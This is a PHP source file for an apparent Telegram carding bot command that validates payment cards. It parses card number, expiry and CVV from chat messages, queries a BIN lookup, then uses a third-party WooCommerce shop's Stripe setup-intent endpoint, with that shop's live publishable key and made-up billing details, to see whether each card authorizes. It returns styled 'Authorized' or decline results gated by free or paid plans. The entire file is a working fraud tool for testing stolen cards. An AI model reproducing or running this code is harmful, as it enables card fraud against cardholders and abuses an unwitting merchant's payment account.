<?php
include __DIR__."/../config/variables.php";
include __DIR__."/config/users.php";
include_once __DIR__."/../functions/bot.php";
include_once __DIR__."/../functions/functions.php";




if ((strpos($message, "/au") === 0)||(strpos($message, "!au") === 0)||(strpos($message, ".au") === 0)){
    if(!in_array($chat_id, $auchats)){
    if($plan == 'free'){
        bot('sendmessage',[
            'chat_id'=>$chat_id,
            'text'=>"<b>Not Authorised. Join <a href='t.me/DarkxxChat'>Here</a> To Use Free Gates</b>",
            'parse_mode'=>'html',
            'reply_to_message_id'=> $message_id
            ]);
        return;
    }
}

$message = substr($message, 4);
$messageidtoedit1 = bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"<b>Wait for Result...</b>",
    'parse_mode'=>'html',
    'reply_to_message_id'=> $message_id
]);

$messageidtoedit = Getstr(json_encode($messageidtoedit1), '"message_id":', ',');

$cc = multiexplode(array(":", "/", " ", "|"), $message)[0];
$mes = multiexplode(array(":", "/", " ", "|"), $message)[1];
$ano = multiexplode(array(":", "/", " ", "|"), $message)[2];
$cvv = multiexplode(array(":", "/", " ", "|"), $message)[3];
$amt = '1';
if(empty($cc)||empty($cvv)||empty($mes)||empty($ano)){
    bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoedit,
            'text'=>"Invalid details \nFormat -> cc|mm|yy|cvv",
            'parse_mode'=>'html',
            'disable_web_page_preview'=>'true'
            ]);
    return;
};
if(strlen($ano) == '4'){
    $an = substr($ano, 2);
}
else{
  $an = $ano;
}
    $amount = $amt * 100;
//------------Card info------------//
$lista = ''.$cc.'|'.$mes.'|'.$an.'|'.$cvv.'';
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: lookup.binlist.net',
        'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '');
        $fim = curl_exec($ch);
        $bank = GetStr($fim, '"bank":{"name":"', '"');
        $name = GetStr($fim, '"name":"', '"');
        $brand = GetStr($fim, '"brand":"', '"');
        $country = GetStr($fim, '"country":{"name":"', '"');
        $emoji = GetStr($fim, '"emoji":"', '"');
        $scheme = GetStr($fim, '"scheme":"', '"');
        $type = GetStr($fim, '"type":"', '"');
        if(strpos($fim, '"type":"credit"') !== false){
        $bin = 'Credit';
        }else{
        $bin = 'Debit';
        };


//------------Card info------------//
  
# -------------------- [1 REQ] -------------------#
    $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://stateaffairs.com/?wc-ajax=wc_stripe_frontend_request&elementor_page_id=8&path=/wc-stripe/v1/setup-intent');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method=stripe_cc');
    $result1 = curl_exec($ch);
    $client = Getstr($result1,'"client_secret":"','"');
    $pi = Getstr($result1,'"client_secret":"','_secret');




    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents/'.$pi.'/confirm');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[billing_details][name]=Dark+Soul&payment_method_data[billing_details][address][city]=New+York+City&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][line1]=Near+Cp&payment_method_data[billing_details][address][postal_code]=10001&payment_method_data[billing_details][address][state]=NY&payment_method_data[billing_details][email]=dsoul1'.$mail.'2%40gmail.com&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[payment_user_agent]=stripe.js%2F5b37d8a1b0%3B+stripe-js-v3%2F5b37d8a1b0&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51HcXmvDqotq1S9R5e86L51GljOwHbcTdU7ajRRWIqiFXS650Soc0fxBCKN3oJkB6uMYwpVMtE3V5vDUMErFpspIU00PAsLtJuz&_stripe_account=acct_1HcXmvDqotq1S9R5&_stripe_version=2022-08-01&client_secret='.$client.'');
    $result2 = curl_exec($ch);
    $msg2 = Getstr($result2,'"message": "','"');

  ////////--[Responses]--////////

    if(strpos($result2, '"status": "succeeded"' )) {
        bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoedit,
            'text'=>"━━━━━[🌹𝑫𝒂𝒓𝒌🌹]━━━━━
💳 𝑪𝑪 ➔ <code>$lista</code>
✅ 𝑹𝒆𝒔𝒑𝒐𝒏𝒔𝒆 ➔ 𝑨𝒖𝒕𝒉𝒐𝒓𝒊𝒛𝒆𝒅
⛩️ 𝑮𝒂𝒕𝒆 ➔ 𝑺𝒕𝒓𝒊𝒑𝒆 𝑨𝒖𝒕𝒉

━━━━━[📜𝑫𝒆𝒕𝒂𝒊𝒍𝒔📜]━━━━━
🏦 𝑩𝒂𝒏𝒌 ➔ $bank
💠 𝑻𝒚𝒑𝒆 ➔ $bin
🌎 𝑪𝒐𝒖𝒏𝒕𝒓𝒚 ➔ $name $emoji

━━━━━[✨𝑰𝒏𝒇𝒐✨]━━━━━
♦️ 𝑪𝒉𝒆𝒄𝒌𝒆𝒅 𝑩𝒚 ➔ $user
♦️ 𝑩𝒐𝒕 𝑩𝒚 ➔ <a href='t.me/Darkxupdate'> 𝘿𝙖𝙍𝙠𝙨𝙊𝙡 ✘ </a>",
            'parse_mode'=>'html',
            'disable_web_page_preview'=>'true'
            ]);
    }
    elseif((empty($client)) || (empty($pi))) {
        bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoedit,
            'text'=>"━━━━━[🌹𝑫𝒂𝒓𝒌🌹]━━━━━
💳 𝑪𝑪 ➔ <code>$lista</code>
❌ 𝑹𝒆𝒔𝒑𝒐𝒏𝒔𝒆 ➔ <b>Unable To Create Intent With This Card</b>
⛩️ 𝑮𝒂𝒕𝒆 ➔ 𝑺𝒕𝒓𝒊𝒑𝒆 𝑨𝒖𝒕𝒉

━━━━━[📜𝑫𝒆𝒕𝒂𝒊𝒍𝒔📜]━━━━━
🏦 𝑩𝒂𝒏𝒌 ➔ $bank
💠 𝑻𝒚𝒑𝒆 ➔ $bin
🌎 𝑪𝒐𝒖𝒏𝒕𝒓𝒚 ➔ $name $emoji

━━━━━[✨𝑰𝒏𝒇𝒐✨]━━━━━
♦️ 𝑪𝒉𝒆𝒄𝒌𝒆𝒅 𝑩𝒚 ➔ $user
♦️ 𝑩𝒐𝒕 𝑩𝒚 ➔ <a href='t.me/Darkxupdate'> 𝘿𝙖𝙍𝙠𝙨𝙊𝙡 ✘ </a>",
            'parse_mode'=>'html',
            'disable_web_page_preview'=>'true'
            ]);
    }
    else {
        bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoedit,
            'text'=>"━━━━━[🌹𝑫𝒂𝒓𝒌🌹]━━━━━
💳 𝑪𝑪 ➔ <code>$lista</code>
❌ 𝑹𝒆𝒔𝒑𝒐𝒏𝒔𝒆 ➔ <b>$msg2</b>
⛩️ 𝑮𝒂𝒕𝒆 ➔ 𝑺𝒕𝒓𝒊𝒑𝒆 𝑨𝒖𝒕𝒉

━━━━━[📜𝑫𝒆𝒕𝒂𝒊𝒍𝒔📜]━━━━━
🏦 𝑩𝒂𝒏𝒌 ➔ $bank
💠 𝑻𝒚𝒑𝒆 ➔ $bin
🌎 𝑪𝒐𝒖𝒏𝒕𝒓𝒚 ➔ $name $emoji

━━━━━[✨𝑰𝒏𝒇𝒐✨]━━━━━
♦️ 𝑪𝒉𝒆𝒄𝒌𝒆𝒅 𝑩𝒚 ➔ $user
♦️ 𝑩𝒐𝒕 𝑩𝒚 ➔ <a href='t.me/Darkxupdate'> 𝘿𝙖𝙍𝙠𝙨𝙊𝙡 ✘ </a>",
            'parse_mode'=>'html',
            'disable_web_page_preview'=>'true'
            ]);
    }
}

?>
